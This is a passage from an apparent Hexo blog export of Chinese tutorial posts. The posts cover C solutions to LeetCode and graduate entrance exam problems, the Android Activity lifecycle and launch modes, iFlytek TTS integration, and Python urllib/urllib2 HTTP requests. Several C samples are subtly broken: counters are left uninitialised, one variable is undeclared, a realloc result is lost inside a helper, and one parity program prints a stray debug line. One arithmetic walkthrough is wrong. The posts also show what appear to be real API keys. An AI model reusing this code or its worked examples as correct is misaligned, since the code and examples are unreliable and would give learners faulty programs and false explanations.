利用此规律：每个i中1的个数都是i&amp;(i-1)中1的个数的值加1 解法二C语言实现注：这是可直接运行的代码，并没有按leetcode的格式提交。 12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int i,n; int *p; scanf(&quot;%d&quot;,&amp;n); p = (int *)malloc(sizeof(int)*(++n)); //动态分配内存 if(n == 1) p[0] = 0; else &#123; p[0] = 0; for(i=1;i&lt;n;i++) p[i] = p[i&amp;(i-1)] + 1; //得到1的个数 &#125; for(i=0;i&lt;n;i++) printf(&quot;%d &quot;,p[i]); //输出数组 printf(&quot;\n&quot;); return 0;&#125; 奇偶校验华科2010年研究生复试机试题 题目描述输入一个字符串，然后对每个字符进行奇校验，最后输出校验后的二进制数(如’3’，输出：10110011)。 输入：输入包括一个字符串，字符串长度不超过100。 输出：可能有多组测试数据，对于每组数据，对于字符串中的每一个字符，输出按题目进行奇偶校验后的数，每个字符校验的结果占一行。 样例输入： 3 3a 样例输出： 10110011 10110011 01100001 思路分析先判断该字符的ASCLL码对应的二进制表示中1的个数是奇数还是偶数，如果是奇数则将该字符的ASCLL码对应的二进制表示的各个位直接输出，如果是偶数则先将最高位或上1，使其中1的个数为奇数个，再将该字符的ASCLL码对应的二进制表示的各个位输出。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int oddCheck(char c) //判断二进制表示中1的个数为奇数个还是偶数个&#123; int count,i; for(i=0;i&lt;7;i++) &#123; if(c&amp;(1&lt;&lt;i)) count++; //计数 &#125; if((count%2) == 0) return 1; else return 0; &#125;int main()&#123; int len,i,j; char a[100]; scanf(&quot;%s&quot;,a); printf(&quot;%d\n&quot;,a[0]); len = strlen(a); for(i=0;i&lt;len;i++) &#123; if(oddCheck(a[i])) a[i] = a[i] | (1&lt;&lt;7); //如果1的个数为偶数个，则将最高位置为1 for(j=7;j&gt;=0;j--) &#123; if(a[i]&amp;(1&lt;&lt;j)) //按顺序输出各个位 printf(&quot;1&quot;); else printf(&quot;0&quot;); &#125; printf(&quot;\n&quot;); &#125; return 0; &#125; 比较奇偶数个数北邮2010年研究生复试机试题 题目描述第一行输入一个数，为n，第二行输入n个数，这n个数中，如果偶数比奇数多，输出NO，否则输出YES。 输入：输入有多组数据。每组输入n，然后输入n个整数（1&lt;=n&lt;=1000）。 输出：如果偶数比奇数多，输出NO，否则输出YES。 样例输入： 5 1 5 2 4 3 样例输出： YES 思路分析通过对2取余来判断这个数是奇数还是偶数，并进行计数，最后比较奇偶计数的大小得到结果进行输出。 C语言实现1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int even,odd,n,i; int *p; while(scanf(&quot;%d\n&quot;,&amp;n) != EOF) &#123; p = (int *)malloc(sizeof(int)*n); for(i=0;i&lt;n;i++) &#123; scanf(&quot;%d&quot;,&amp;p[i]); if(p[i]%2 == 0) even++; //偶数计数 else odd++; //奇数计数 &#125; if(even &gt; odd) printf(&quot;NO\n&quot;); else printf(&quot;YES\n&quot;); &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(一)]]></title>
    <url>%2F2016%2F08%2F10%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[在知乎上看到别人分享算法学习之路，确实有很多的经验值得借鉴，其中LeetCode在线判题平台汇集了很多名企的笔试面试算法题，还有牛客网等网站都有不错的算法习题资源，所以打算要坚持刷一刷题。 因为不是纯粹为了刷题而刷题，而是为了学习和练习算法，需要总结，所以就把刷过的题都写进了博客，同时也算是将自己做题的一些过程进行分享。 Sum of Two IntegersLeetCode第371题 题目描述Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -. Example: Given a = 1 and b = 2, return 3. 思路分析12345678910111213141516171819202122232425262728293031323334题目要求不能使用加减号，于是想到使用按位操作来进行解题。先将十进制数转换成二进制数观察规律，综合考虑如下情况：1、没有进位的情况10 + 5 = 15 即二进制的：1111使用异或运算可得到此结果：a = 10; b = 5;转换成二进制为：a = 1010 b = 0101a^b = 11112、有进位的情况20 + 25 = 45 即二进制的：101101使用异或运算:a = 10100 b = 11001a^b = 01101 此结果没有进位要想得到结果，需将a^b的结果与a&amp;b然后左移一位的结果进行异或a&amp;b = 10000 a^b = 01101(a^b)^((a&amp;b)&lt;&lt;1) 即01101^100000 = 101101综合考虑，每次都需判断a&amp;b是否为0，如果不为0则需要将a^b的结果与a&amp;b然后左移一位的结果进行异或，直到a&amp;b的结果为0，即不再有进位时，才输出结果。例如：a = 10 b =10 a+b = 14 即二进制的：11000第一次：a=1010 b=1110 a&amp;b = 1010 不为0a^b = 0100第二次：a = 1010&lt;&lt;1 b = 0100a&amp;b = 00100 不为0a^b = 10000第三次：a = 001000 b = 10000a&amp;b = 00000a^b = 11000 即24 C语言实现12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int getSum(int a,int b)&#123; int carry,result; carry = a&amp;b; result = a^b; if(carry) &#123; return getSum(carry&lt;&lt;1,result); &#125;else &#123; return result; &#125; return 0;&#125;int main()&#123; int a,b,m; while(scanf(&quot;%d %d&quot;,&amp;a,&amp;b) != EOF) &#123; m = getSum(a,b); printf(&quot;%d\n&quot;,m); &#125; return 0;&#125; 二进制数北邮2012年研究生复试机试题 题目描述大家都知道，数据在计算机里中存储是以二进制的形式存储的。有一天，小明学了C语言之后，他想知道一个类型为unsigned int 类型的数字，存储在计算机中的二进制串是什么样子的。你能帮帮小明吗？并且，小明不想要二进制串中前面的没有意义的0串，即要去掉前导0。 输入： 第一行，一个数字T（T&lt;=1000），表示下面要求的数字的个数。接下来有T行，每行有一个数字n（0&lt;=n&lt;=10^8），表示要求的二进制串。 输出： 输出共T行。每行输出求得的二进制串。 样例输入： 5 23 535 2624 56275 989835 样例输出： 10111 1000010111 101001000000 1101101111010011 11110001101010001011 思路分析12345678910十进制数转二进制，很快就应该想到使用除二取余来解决问题，举个例子来分析一下：11/2 = 5 ---15/2 = 2 ---12/2 = 1 ---01/2 = 0 ---1结果为：1011，分析结果可知，先得到的余数在结果字符串的后面，即先得到的位后输出，后得到的位先输出，这不就是栈的后进先出特点吗？因此，我们使用除二取余的办法将得到的各个余数压入栈中，待除二的结果为0时，再将栈中的各位弹出，即可得到二进制串。 C语言实现：12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct&#123; int top; int data[100];&#125;stack;void convert_to_binary(stack *s, unsigned long int d)&#123; s-&gt;top = 0; while (d) &#123; s-&gt;data[s-&gt;top ++] = d % 2; d /= 2; &#125; while (s-&gt;top) &#123; printf(&quot;%d&quot;, s-&gt;data[-- s-&gt;top]); &#125; printf(&quot;\n&quot;);&#125;int main()&#123; int i, n; unsigned long int d; stack *s = (stack *)malloc(sizeof(stack)); while (scanf(&quot;%d&quot;, &amp;n) != EOF) &#123; for (i = 0; i &lt; n; i ++) &#123; scanf(&quot;%ld&quot;, &amp;m); if (m != 0) &#123; convert_to_binary(s, m); &#125;else &#123; printf(&quot;0\n&quot;); &#125; &#125; &#125; return 0;&#125; 字符串连接华科2010年研究生复试机试题 题目描述不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。 输入：每一行包括两个字符串，长度不超过100。 输出：可能有多组测试数据，对于每组数据，不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。输出连接后的字符串。 样例输入： abc def 样例输出： abcdef 思路分析方案一： 开辟三个字符数组，使用循环遍历数组并将第二个数组的字符复制给第一个数组，再复制第三个数组到第一个数组。 方案一C语言实现123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void contact(char *str, char *str1, char *str2)&#123; int i,j; for(i=0;str1[i]!=&apos;\0&apos;;i++) &#123; str[i]=str1[i]; &#125; for(j=0;str2[j]!=&apos;\0&apos;;j++) &#123; str[i+j]=str2[j]; &#125; str[i+j]=&apos;\0&apos;;&#125;int main()&#123; char str[202],str1[101],str2[101]; while(scanf(&quot;%s%s&quot;,str1,str2) != EOF) &#123; contact(str, str1, str2); printf(&quot;%s\n&quot;,str); &#125; return 0;&#125; 方案二： 其实呢，这个题是可以取巧的，有没有发现输入是在一行，我们只要把这一行输入直接看成一个字符串，然后把除空格之外的其他字符全部输出不就好了？ 方案二C语言实现12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; char a[202]; int i; while(gets(a)!=&apos;\0&apos;) &#123; i=0; while(a[i]!=&apos;\0&apos;) &#123; if(a[i]!=&apos; &apos;) printf(&quot;%c&quot;,a[i]); i++; &#125; printf(&quot;\n&quot;); &#125; return 0;&#125; 另外的思考： 搜这个题目的时候，看到别人提出的问题，确实有些道理啊。由于题目中并没有对”无冗余“的含义做出解释，我们可以把它理解为不占用多余的内存空间来存储输入的字符串。方案一直接定义字符数组，无法实现无冗余，因为数组大小已经固定，但是不一定有那么多字符，因此会造成空间的浪费。就想到用动态内存分配函数malloc和realloc来实现”无冗余“。 malloc：向系统申请分配指定size个字节的内存空间。返回类型是 void* 类型。 realloc：对malloc申请的内存进行大小的调整. 然后，由于上面已经发现了这个题的一个取巧的办法，所以这里将题目格式稍作更改，算是一个改编吧。 样例输入： abc def 样例输出： abcdef C语言实现1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int getString(char *str)&#123; int len = 1; char m; while((m = getchar()) != &apos;\n&apos;) &#123; str = (char *)realloc(str,sizeof(char)*len); *(str+len-1) = m; len++; &#125; str = (char *)realloc(str,sizeof(char)*len); *(str+len-1) = &apos;\0&apos;; return len;&#125;int main()&#123; int len1,len2,k; char m,n; char *str1 = (char *)malloc(sizeof(char)); char *str2 = (char *)malloc(sizeof(char)); len1 = getString(str1); len2 = getString(str2); str1 = (char *)realloc(str1,sizeof(char)*(len1+len2-1)); for(k=0;k&lt;len2;k++) &#123; *(str1+len1+k-1) = *(str2+k); &#125; printf(&quot;%s\n&quot;,str1); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Activity生命周期与启动模式]]></title>
    <url>%2F2016%2F08%2F09%2FAndroid-Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%B8%8E%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Android 程序的生命周期是由系统控制而非程序自身直接控制，因此了解和管理Activity的生命周期对于Android应用程序开发来说都是十分重要的。本文通过实例演示了Activity的生命周期，并对Android的任务栈设计以及Activity的启动模式进行了介绍。 Activity生命周期官方文档对Activity的生命周期进行了详细的描述，其中，示意图如下： 在Activity的生命周期里会调用以下方法，具体的描述如下表： 方法 描述 onCreat() 当activity启动时调用 onStart() 当activity对用户来说可见时调用 onResume() 当activity将要开始与用户进行交互时调用 onPause() 当系统将要开始恢复以前的activity时调用。 onStop() 当activity不再对用户可见时调用，因为另一个活动已恢复，并覆盖了这一个。 onRestart() 当一个activity被停止后，被重新启动时调用 onDestroy() 当activity被销毁时调用 我们通过重写以上7个方法来观察各个方法的执行情况： MianActivity.java:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class MainActivity extends Activity &#123; private Button mButton; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); System.out.println(&quot;MainActivity: onCreate()&quot;); mButton = (Button) findViewById(R.id.btn_to_another); mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub Intent intent = new Intent(MainActivity.this,AnotherActivity.class); startActivity(intent); &#125; &#125;); &#125; @Override protected void onStart() &#123; // TODO Auto-generated method stub super.onStart(); System.out.println(&quot;MainActivity: onStart()&quot;); &#125; @Override protected void onResume() &#123; // TODO Auto-generated method stub super.onResume(); System.out.println(&quot;MainActivity: onResume()&quot;); &#125; @Override protected void onPause() &#123; // TODO Auto-generated method stub super.onPause(); System.out.println(&quot;MainActivity: onPause()&quot;); &#125; @Override protected void onRestart() &#123; // TODO Auto-generated method stub super.onRestart(); System.out.println(&quot;MainActivity: onRestart()&quot;); &#125; @Override protected void onStop() &#123; // TODO Auto-generated method stub super.onStop(); System.out.println(&quot;MainActivity: onStop()&quot;); &#125; @Override protected void onDestroy() &#123; // TODO Auto-generated method stub super.onDestroy(); System.out.println(&quot;MainActivity: onDestroy()&quot;); &#125; &#125; AnotherActivity的代码与MainActivity的代码基本相同，在这里就不再贴代码了。 以下是运行程序之后各个情况下的控制台输出： App启动时123MainActivity: onCreat()MainActivity: onStart()MainActivity: onResume() 锁屏或者按下Home键时12MainActivity: onPause()MainActivity: onStop() 解锁或者返回到App时123MainActivity: onRestart()MainActivity: onStart()MainActivity: onResume() 按下Back键时123MainActivity: onPause()MainActivity: onStop()MainActivity: onDestroy() 按下跳转到AnotherActivity按钮时12345MainActivity: onPause()AnotherActivity: onCreat()AnotherActivity: onStart()AnotherActivity: onResume()MainActivity: onStop() 按下跳转到MainActivity按钮时12345AnotherActivity: onPause()MainActivity: onCreat()MainActivity: onStart()MainActivity: onResume()AnotherActivity: onStop() 可以看到，我们在跳转到AnotherActivity时MainActivity并没有被Destroy掉，但是我们按下跳转到MainActivity的按钮时执行了onCeate()方法，即重新创建了一个MainActivity实例，这是为什么呢？其实，这就和Activity的启动模式有关了，请看下文Activity的启动模式。 再按下Back键时123456MainActivity: onPause()AnotherActivity: onRestart()AnotherActivity: onStart()AnotherActivity: onResume()MainActivity: onStop()MainActivity: onDestroy() 注意看，我们在不同的Activity之间切换时，都是先执行的本Activity的onPause()方法，待新的Activity创建启动并显示出来之后，才执行本Activity的onStop()方法，这样的生命周期设计是有他的道理的，首先防止同时显示两个Activity，然后防止另一个Activity启动失败，导致出现黑屏的情况。 Activity四种启动模式Android采用Task来管理多个Activity，任务栈(task stack)，又称为后退栈(back stack)，记录存放用户开启的activity的。在Android操作系统里面会存在多个任务栈，应用程序一被开启系统就给他分配一个任务栈，当所有的Activity都退出的时候，任务栈就清空了，置于栈顶的Activity就是用户看到的Activity。 standard模式默认模式，可以不用写配置。在这个模式下，每次激活Activity都会默认创建一个新的实例。因此，在这种模式下，可以有多个相同的实例，也允许多个相同Activity叠加。 singleTop模式可以有多个实例，但是不允许多个相同Activity叠加。分为两种情况： （1）如果Activity在栈顶的时候，启动相同的Activity，不会创建新的实例，而会调用其onNewIntent方法。 （2）如果Activity不在栈顶的时候，启动Activity时会创建新的实例。 singleTask模式只有一个实例。分为三种情况： （1）如果启动的目标Activity不存在Task栈中,系统将会创建一个目标Activity实例,并将它加入到Task栈顶。 （2）如果启动的目标Activity已存在Task栈顶,此时模式和singleTop模式相同。 （3）若果启动的目标Activity已存在但没有位于Task栈顶,系统将会把该目标Activity上面的所有Activity移除Task栈,使该Activity置于Task栈顶。 singleInstance模式只有一个实例，并且这个实例独立运行在一个task中，这个task只有这个实例，不允许有别的Activity存在。 此启动模式和我们使用的浏览器工作原理类似，我们都知道在多个程序中访问浏览器时，如果当前浏览器没有打开，则打开浏览器，否则会在当前打开的浏览器中访问。此模式会节省大量的系统资源，因为他能保证要请求的Activity对象在当前的栈中只存在一个。 配置启动模式Android Activity的启动方式可以在AndroidManifest.xml文件的activity标签中的android:launchMode属性进行配置： 1234&lt;activity android:name=&quot;com.example.activitydemo.MainActivity&quot; android:label=&quot;@string/app_name&quot; android:launchMode=&quot;standard&quot;&gt;&lt;/activity&gt; 有兴趣的话也可以自己写一个小的Demo来对这四种启动模式进行测试，通过创建几个Activity以及切换按钮，然后在各个Activity的onCreat()方法中写入下面的语句来打印activity实例的标识信息： 1System.out.println(toString()); 通过控制台打印的内容我们可以区分Activity启动时是否创建了新的实例。 通过了解Android Activity的启动模式，我们就可以回答上文中Activity生命周期中留下的问题啦，因为Activity默认配置上启动模式是：standard，因此我们每次启动Activity都会创建新的实例。为Activity选择合适的启动模式可以节省更多的资源，这对于应用程序开发很重要。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Activity］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android自带TTS与科大讯飞语音SDK]]></title>
    <url>%2F2016%2F08%2F08%2FAndroid%E8%87%AA%E5%B8%A6TTS%E4%B8%8E%E7%A7%91%E5%A4%A7%E8%AE%AF%E9%A3%9E%E8%AF%AD%E9%9F%B3SDK%2F</url>
    <content type="text"><![CDATA[Text-To-Speach简称TTS，指能够将指定的文本转换成不同的语言音频输出的技术。通过TTS技术我们可以为我们的应用添加语音提醒功能，也可以做具备朗读功能的电子词典或者电子书阅读器等，总之，语音合成、语音识别等技术的应用范围还是很广的。本博客主要介绍Android自带的TTS库以及科大讯飞语音SDK的使用。 Android TTS技术Android的TTS可以将文本随意的转换成以下任意五种语言（English、French、German、Italian和Spanish）的语音输出。很可惜，没有中文的，但是也不用担心，后面我们会介绍其他的办法。 先来使用Android系统自带的TTS库，实现起来很简单，示例如下： 1234567891011121314151617181920212223242526272829@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mButton = (Button) findViewById(R.id.btn_speak); // 创建TTS对象 mSpeech = new TextToSpeech(MainActivity.this, new OnInitListener() &#123; @Override public void onInit(int status) &#123; // TODO Auto-generated method stub if (status == TextToSpeech.SUCCESS) &#123; mSpeech.setLanguage(Locale.ENGLISH); //设置语言为英语 &#125; &#125; &#125;); //点击按钮说话 mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub mSpeech.speak(&quot;Hello World!&quot;, TextToSpeech.QUEUE_FLUSH, null); &#125; &#125;);&#125; 运行程序化后点击按钮你就会听到Hello World！，除此之外还可以设置语速、语调等参数，具体的可以参考官方文档：http://www.android-doc.com/reference/android/speech/tts/package-summary.html 科大讯飞语音SDKAndroid自带的TTS是不支持中文的，但是国内也有很强大的公司在做语音识别，比如众所周知的科大迅飞，它提供了免费的SDK，很多App也都集成了科大讯飞的语音引擎，这里我们也来简单使用一下。 下载科大讯飞Android开发SDK官方地址：http://www.xfyun.cn/ 添加jar包将开发工具包中libs目录下的Msc.jar和armeabi复制到Android工程的libs目录 具体配置步骤可查看开发工具包中doc文件夹下的MSC Develop Manual for Android.pdf文件，里面有详细的介绍。 （1）在工程 AndroidManifest.xml 文件中添加如下权限 文档中还添加了很多其他权限，本博客只介绍了SDK中语音合成功能的使用，如果你需要用到其他的功能那那些权限也是必须要添加的。 123456789101112&lt;!-- 连接网络权限，用于执行云端语音能力 --&gt;&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;!-- 读取网络信息状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;!-- 获取当前wifi状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;&lt;!-- 允许程序改变网络连接状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;&lt;!-- 外存储读权限，构建语法需要用到此权限 --&gt;&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&gt;&lt;!-- 外存储写权限，构建语法需要用到此权限 --&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt; （2）初始化SDK 1SpeechUtility.createUtility(context, SpeechConstant.APPID + &quot;=你申请的APPID&quot;); （3）语音合成基本配置（摘抄自官方文档） 语音合成是将文字信息转化为可听的声音信息，让机器像人一样开口说话。 123456789101112131415161718192021222324252627282930313233//1.创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListenerSpeechSynthesizer mTts= SpeechSynthesizer.createSynthesizer(context, null);//2.合成参数设置mTts.setParameter(SpeechConstant.VOICE_NAME, &quot;xiaoyan&quot;); //设置发音人mTts.setParameter(SpeechConstant.SPEED, &quot;50&quot;);//设置语速mTts.setParameter(SpeechConstant.VOLUME, &quot;80&quot;);//设置音量，范围 0~100mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD); //设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm”mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, &quot;./sdcard/iflytek.pcm&quot;);//3.开始合成mTts.startSpeaking(&quot;科大讯飞，让世界聆听我们的声音&quot;, mSynListener);//合成监听器private SynthesizerListener mSynListener = new SynthesizerListener()&#123; //会话结束回调接口，没有错误时，error为null public void onCompleted(SpeechError error) &#123;&#125; //缓冲进度回调 //percent为缓冲进度0~100，beginPos为缓冲音频在文本中开始位置，endPos表示缓冲音频在 文本中结束位置，info为附加信息。 public void onBufferProgress(int percent, int beginPos, int endPos, String info) &#123;&#125; //开始播放 public void onSpeakBegin() &#123;&#125; //暂停播放 public void onSpeakPaused() &#123;&#125; //播放进度回调 //percent为播放进度0~100,beginPos为播放音频在文本中开始位置，endPos表示播放音频在文 本中结束位置. public void onSpeakProgress(int percent, int beginPos, int endPos) &#123;&#125; //恢复播放回调接口 public void onSpeakResumed() &#123;&#125; //会话事件回调接口 public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) &#123;&#125;&#125;; 简单的Demo博主使用科大讯飞SDK的语音合成功能制作了一个简单的Demo，它可以选择不同的发音人来发音，并且可以调节语速和音量。 以下是MainActivity.java的部分代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //初始化SDK SpeechUtility.createUtility(this, SpeechConstant.APPID + &quot;=571771fd&quot;); mEditText = (EditText) findViewById(R.id.et_speak); mButton = (Button) findViewById(R.id.btn_speak); mSeekBarVolume = (SeekBar) findViewById(R.id.sb_speak_volume); mSeekBarSpeed = (SeekBar) findViewById(R.id.sb_speak_speed); mSpinner = (Spinner) findViewById(R.id.spinner); // 创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListener mTts = SpeechSynthesizer.createSynthesizer(this, null); // 合成参数设置 mTts.setParameter(SpeechConstant.VOICE_NAME, &quot;xiaoyan&quot;); // 设置发音人 mTts.setParameter(SpeechConstant.SPEED, &quot;50&quot;);// 设置语速 mTts.setParameter(SpeechConstant.VOLUME, &quot;80&quot;);// 设置音量，范围 0~100 mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD); // 设置云端 // 设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm” mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, &quot;./sdcard/iflytek.wav&quot;); mSeekBarSpeed.setProgress(50); mSeekBarVolume.setProgress(80); mSpinner.setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1,int position, long arg3) &#123; // TODO Auto-generated method stub // 设置发音人 mTts.setParameter(SpeechConstant.VOICE_NAME, str[position]); &#125; @Override public void onNothingSelected(AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); mSeekBarSpeed.setOnSeekBarChangeListener(new OnSeekBarChangeListener() &#123; @Override public void onStopTrackingTouch(SeekBar seekbar) &#123; // TODO Auto-generated method stub // 设置语速 mTts.setParameter(SpeechConstant.SPEED, seekbar.getProgress()+ &quot;&quot;); &#125; @Override public void onStartTrackingTouch(SeekBar arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onProgressChanged(SeekBar arg0, int arg1, boolean arg2) &#123; // TODO Auto-generated method stub &#125; &#125;); mSeekBarVolume.setOnSeekBarChangeListener(new OnSeekBarChangeListener() &#123; @Override public void onStopTrackingTouch(SeekBar seekbar) &#123; // TODO Auto-generated method stub // 设置音量，范围 0~100 mTts.setParameter(SpeechConstant.VOLUME,seekbar.getProgress() + &quot;&quot;); &#125; @Override public void onStartTrackingTouch(SeekBar arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onProgressChanged(SeekBar arg0, int arg1, boolean arg2) &#123; // TODO Auto-generated method stub &#125; &#125;); mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View arg0) &#123; // TODO Auto-generated method stub String text = mEditText.getText().toString(); // 开始合成 mTts.startSpeaking(text, mSynListener); &#125; &#125;);&#125; 至此，我们就可以为我们的应用添加语音合成功能啦，是不是很方便？其实，除此之外，科大讯飞的SDK还具备语音识别、声纹密码、人脸识别等多种功能，具体的操作方法请参考下载的SDK工具包中的中文文档资料。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,TTS］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Http网络请求]]></title>
    <url>%2F2016%2F08%2F07%2FPython-Http%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[Python网络爬虫开发离不开Http网络请求，此前的几篇Python网络爬虫博客中，对网络爬虫已经有了一些基本的介绍，也使用了一些网络请求库，但是没有对Python网络请求做详细的说明，此篇博客将对Python的Http网络请求进行一个总结，通过列举不同的Http请求库的不同请求写法来熟悉Python的网络请求，从而有利于后续的网络爬虫开发。 注：博主的Python环境为Python2.7.5，使用Python3的读者要注意个别的类库与Python2有很大区别。 urllib与urllib2模块urllib与urllib2比较urllib与urllib2是python自带的库，不需要额外导入，但是很多人可能会比较困惑这两个库有什么区别呢？很多人认为urllib2是urllib的升级版，我之前也是这么认为的，但是这是不对的。 urllib 和urllib2都是接受URL请求的相关模块，但是他们是不可相互替代的，因为提供了不同的功能。整体来说，urllib2是urllib的增强，但是urllib中有urllib2中所没有的函数。他们两个最显著的不同如下： urllib2可以接受一个Request类的实例来设置URL请求的Headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。如果你访问一个网站，想更改User Agent（可以伪装你的浏览器），你就要用urllib2。 urllib支持设置编码的函数，urllib.urlencode，在模拟登陆的时候，经常要post编码之后的参数，所以要想不使用第三方库完成模拟登录，你就需要使用urllib。也正因为如此，urllib常和urllib2一起使用。 urllib模块urlopen()函数的使用urlopen(url, data=None, proxies=None) 参数url：表示远程数据的路径，一般是http或者ftp路径。 可选参数data：表示以post方式提交到url的数据。 可选参数proxies：表示用于代理的设置。 urlopen返回一个类文件对象，它提供了如下方法： read() , readline() , readlines()，fileno()和close()：这些函数的使用与文件对象完全一样。 info()：返回一个httplib.HTTPMessage 对象，表示远程服务器返回的头信息。 getcode()：返回Http状态码，如果是http请求，200表示请求成功完成;404表示网址未找到。 geturl()：返回请求的url地址。 简单GET请求此处代码中的GET请求都是对博主博客的一个404页面发送的请求，会返回服务器响应信息以及网页源代码。 123456789# -*- coding:utf-8 -*-import urllibres = urllib.urlopen(&quot;http://blog.line-coding.tech/&quot;)print res.info()print res.getcode()print res.geturl()print res.read() 123456789101112131415运行结果如下：Date: Sat, 06 Aug 2016 13:48:53 GMTServer: Apache/2.4.6 (CentOS) mod_wsgi/4.5.3 Python/2.7.5 PHP/5.4.16Last-Modified: Thu, 14 Jul 2016 06:29:45 GMTETag: &quot;4f3-53792a0bfd6ca&quot;Accept-Ranges: bytesContent-Length: 1267Connection: closeContent-Type: text/html; charset=UTF-8200http://blog.line-coding.tech/篇幅有限，此处省略了请求页面的html文档。 简单POST请求此处代码的POST请求都是对博主服务器上的一个用户注册API接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个exist，如果注册成功则会返回一个success，请求错误则返回一个go away。 123456789# -*- coding:utf-8 -*-import urlliburl = &apos;http://data.line-coding.tech/register.php&apos;data = &#123;&apos;username&apos;:&apos;13654852343&apos;,&apos;password&apos;:&apos;123456&apos;&#125;res = urllib.urlopen(url, data = urllib.urlencode(data))print res.info()print res.getcode()print res.geturl()print res.read() 123运行结果如下：篇幅有限，此处只写出服务器返回的内容exist urllib2模块urllib2用一个Request对象来映射你提出的HTTP请求,在它最简单的使用形式中你将用你要请求的地址创建一个Request对象，通过调用urlopen并传入Request对象，将返回一个相关请求response对象，这个应答对象如同一个文件对象，所以你同样可以像在使用urllib模块时调用info()、getcode()、geturl()、read()等函数。 简单GET请求12345678# -*- coding:utf-8 -*-import urllib2res = urllib2.urlopen(&quot;http://blog.line-coding.tech/&quot;)print res.info()print res.getcode()print res.geturl()print res.read() 1运行结果同urllib的GET方法 说明： 下文中使用到百度APIStore中一个既可以接收GET请求又可以接收POST请求的查询学校信息的API接口，该接口的使用方法可参考 相关文档（http://apistore.baidu.com/apiworks/servicedetail/2843.html），简单说来，使用它时需要传递一个学校名字的参数，以及添加自己的百度API Store的API-key。由于它既可以接收GET请求又可以接收POST请求，所以下文的示例代码中会得到很多同样的结果，但是采用GET方法时参数是连接在在url后面的，而POST方法则不是，请大家注意区分。 带Header的POST请求12345678910# -*- coding:utf-8 -*-import urllib,urllib2from urllib import urlencodeurl = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;req = urllib2.Request(url, urlencode(data))req.add_header(&quot;apikey&quot;, &quot;c57bc70b78d5926e8cfbb3ad9c195465&quot;) 